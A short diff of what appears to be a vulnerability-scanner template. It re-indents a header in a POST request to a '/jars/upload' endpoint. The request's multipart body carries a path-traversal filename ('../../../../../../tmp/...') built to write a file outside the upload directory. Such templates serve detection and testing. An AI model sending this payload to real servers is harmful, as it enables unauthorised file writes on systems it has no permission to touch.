@@ -5,7 +5,7 @@ rules:
   - method: POST
     path: /jars/upload
     headers:
-          Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+      Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
     body: |-
       --8ce4b16b22b58894aa86c421e8759df3
       Content-Disposition: form-data; name="jarfile";filename="../../../../../../tmp/{{r1}}"
